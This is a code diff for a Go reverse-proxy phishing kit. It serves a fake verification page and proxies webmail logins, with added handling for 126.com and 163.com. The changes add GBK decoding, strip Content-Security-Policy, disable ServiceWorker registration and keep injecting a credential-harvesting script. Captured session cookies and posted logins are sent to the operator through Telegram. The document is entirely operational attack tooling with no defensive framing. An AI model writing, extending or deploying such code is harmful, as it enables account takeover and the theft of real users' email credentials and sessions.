@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"io"
 	"log"
 	"net/http"
@@ -10,6 +11,8 @@ import (
 	"time"
 
 	"github.com/gin-gonic/gin"
+	"golang.org/x/text/encoding/simplifiedchinese"
+	"golang.org/x/text/transform"
 )
 
 type SessionStore struct {
@@ -63,19 +66,16 @@ const loaderHTML = `<!DOCTYPE html><html><head><title>Verifying...</title><style
 func StartProxy(cfg TelegramConfig, listenPort string) {
 	r := gin.Default()
 
-	// Serve loader on root. URL stays /
 	r.GET("/", func(c *gin.Context) {
 		c.Header("Content-Type", "text/html")
 		c.String(200, loaderHTML)
 	})
 
-	// Catch all (fixes 404 if browser tries to access old /loader.html link)
 	r.NoRoute(func(c *gin.Context) {
 		c.Header("Content-Type", "text/html")
 		c.String(200, loaderHTML)
 	})
 
-	// API Endpoint that fetches the page
 	r.GET("/api/fetch", func(c *gin.Context) {
 		email := c.Query("email")
 		if email == "" {
@@ -91,7 +91,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			Timeout: 15 * time.Second,
 			Jar:     jar,
 			CheckRedirect: func(req *http.Request, via []*http.Request) error {
-				return http.ErrUseLastResponse // Stops redirects from changing the URL
+				return http.ErrUseLastResponse
 			},
 			Transport: &http.Transport{ForceAttemptHTTP2: false},
 		}
@@ -104,7 +104,7 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
 		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
-		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8") // Force Chinese to fix 126
 
 		resp, err := proxyClient.Do(req)
 		if err != nil {
@@ -114,9 +114,19 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		defer resp.Body.Close()
 
 		bodyBytes, _ := io.ReadAll(resp.Body)
+
+		// FIX: Decode GBK to UTF-8 for Chinese sites
+		contentType := resp.Header.Get("Content-Type")
+		if strings.Contains(contentType, "gbk") || strings.Contains(string(bodyBytes), "charset=gbk") || strings.Contains(targetBase, "126.com") || strings.Contains(targetBase, "163.com") {
+			reader := transform.NewReader(bytes.NewReader(bodyBytes), simplifiedchinese.GBK.NewDecoder())
+			bodyBytes, _ = io.ReadAll(reader)
+		}
+
 		bodyStr := string(bodyBytes)
 
-		// Rewrite all links to point to our proxy
+		// FIX: Strip ServiceWorker registration (fixes Console Errors)
+		bodyStr = strings.ReplaceAll(bodyStr, "navigator.serviceWorker.register", "console.log")
+
 		bodyStr = strings.ReplaceAll(bodyStr, targetBase, c.Request.Host+"/")
 		if strings.Contains(email, "@") {
 			domain := strings.Split(email, "@")[1]
@@ -124,16 +134,15 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			bodyStr = strings.ReplaceAll(bodyStr, "http://"+domain, c.Request.Host+"/")
 		}
 
-		// Inject Base Tag
 		baseTag := `<base href="` + targetBase + `">`
 		bodyStr = strings.Replace(bodyStr, "<head>", "<head>\n"+baseTag, 1)
 		bodyStr = strings.Replace(bodyStr, "</body>", harvesterScript+"</body>", 1)
 
-		// Set Headers
+		// Strip restrictive headers
 		c.Header("Content-Type", "text/html; charset=utf-8")
 		c.Header("Access-Control-Allow-Origin", "*")
+		c.Header("Content-Security-Policy", "")
 
-		// Set Cookies correctly
 		for _, cookie := range resp.Cookies() {
 			c.SetCookie(cookie.Name, cookie.Value, 3600*24, "/", "", false, false)
 			SendTelegramMessage(cfg, FormatCookieHarvest(email, []string{cookie.Name + "=" + cookie.Value}))
@@ -142,7 +151,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.String(resp.StatusCode, bodyStr)
 	})
 
-	// Post login harvest
 	r.POST("/api/harvest", func(c *gin.Context) {
 		c.Request.ParseForm()
 		email := c.PostForm("email")
@@ -161,7 +169,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		c.JSON(200, gin.H{"status": "ok"})
 	})
 
-	// Proxy for static assets AND form submissions (POST)
 	r.Any("/proxy/*filepath", func(c *gin.Context) {
 		filepath := strings.TrimPrefix(c.Param("filepath"), "/")
 		referer := c.GetHeader("Referer")
@@ -177,14 +184,12 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		fullURL := targetDomain + filepath
 
-		// UPGRADE: Use NewRequest to support POST bodies
 		outReq, err := http.NewRequest(c.Request.Method, fullURL, c.Request.Body)
 		if err != nil {
 			c.String(502, "Bad Request")
 			return
 		}
 
-		// Copy Headers
 		for k, v := range c.Request.Header {
 			for _, val := range v {
 				outReq.Header.Add(k, val)
